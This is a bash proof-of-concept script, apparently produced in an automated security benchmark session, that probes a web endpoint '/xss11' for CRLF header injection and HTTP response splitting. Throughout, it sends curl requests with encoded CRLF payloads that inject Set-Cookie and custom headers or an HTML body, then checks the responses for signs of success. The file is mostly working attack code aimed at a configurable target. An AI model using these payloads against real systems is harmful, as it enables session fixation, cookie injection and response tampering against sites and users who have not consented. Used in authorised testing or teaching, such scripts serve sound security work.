#!/bin/bash
# POC: CRLF Injection POC - Version 2 with improved detection of HTTP header injection
# Target: ./repo
# Created: 2025-11-05T17:20:49.514Z
# Session: benchmark-XBEN-012-24-mhm7ivyh

# CRLF Injection POC for /xss11 endpoint - Version 2
# Tests if CRLF sequences in the 'name' parameter result in HTTP header injection
# This demonstrates vulnerability if the application uses user input in HTTP response headers

TARGET_URL="${1:-http://localhost:5000}"
ENDPOINT="/xss11"

echo "[*] CRLF Injection POC - Version 2"
echo "[*] Target: $TARGET_URL$ENDPOINT"
echo "[*] Testing if CRLF sequences in 'name' parameter can inject HTTP headers"
echo ""

# Test 1: Check if CRLF in name parameter results in injected Set-Cookie header
echo "[TEST 1] Attempting to inject Set-Cookie header via CRLF"
echo "[*] Sending request with CRLF + Set-Cookie injection payload..."
RESPONSE=$(curl -v "$TARGET_URL$ENDPOINT?name=test%0d%0aSet-Cookie:%20injected=true" 2>&1)

# Look for signs of header injection in response
if echo "$RESPONSE" | grep -i "injected" > /dev/null; then
    echo "[+] Potential header injection detected!"
    echo "[*] Response contains 'injected' string"
else
    echo "[-] No obvious injection detected"
fi

# Check for multiple Set-Cookie headers
SET_COOKIE_COUNT=$(echo "$RESPONSE" | grep -i "^Set-Cookie:" | wc -l)
echo "[*] Number of Set-Cookie headers: $SET_COOKIE_COUNT"

# Check for custom headers we tried to inject
if echo "$RESPONSE" | grep -i "X-Injected" > /dev/null; then
    echo "[+] Custom header injection successful!"
fi

# Test 2: Response splitting with blank line injection
echo ""
echo "[TEST 2] Response splitting attempt with blank line (%0d%0a%0d%0a)"
RESPONSE2=$(curl -v "$TARGET_URL$ENDPOINT?name=test%0d%0a%0d%0a%3Ch1%3EInjected%3C/h1%3E" 2>&1)

# Count number of HTTP responses (blank line would separate them)
BLANK_LINES=$(echo "$RESPONSE2" | grep -c "^$")
echo "[*] Number of blank lines in response: $BLANK_LINES"

if [ "$BLANK_LINES" -gt 2 ]; then
    echo "[+] Possible response splitting detected (multiple blank lines)"
fi

# Test 3: Check raw HTTP response for CRLF sequences
echo ""
echo "[TEST 3] Raw HTTP response analysis"
echo "[*] Looking for actual CRLF sequences in response headers..."

# Use printf to properly handle CRLF and test
echo "[*] Testing with proper CRLF encoding..."
curl -s -i "$TARGET_URL$ENDPOINT" --data-urlencode "name=test
Set-Cookie: injected=yes" 2>&1 | head -20

echo ""
echo "[TEST 4] Direct CRLF injection in URL"
# Create a test with actual encoded CRLF
PAYLOAD="test%0d%0aX-Hacked:%20true"
echo "[*] Payload: $PAYLOAD"
curl -s -i "$TARGET_URL$ENDPOINT?name=$PAYLOAD" 2>&1 | grep -E "^(HTTP|Set-Cookie|X-|Content-)" | head -10

echo ""
echo "[*] POC Complete"
echo "[*] If CRLF sequences in the 'name' parameter result in:"
echo "[*]   - Additional HTTP headers being set"
echo "[*]   - Multiple response blocks"
echo "[*]   - Custom header injection"
echo "[*] Then the vulnerability is confirmed"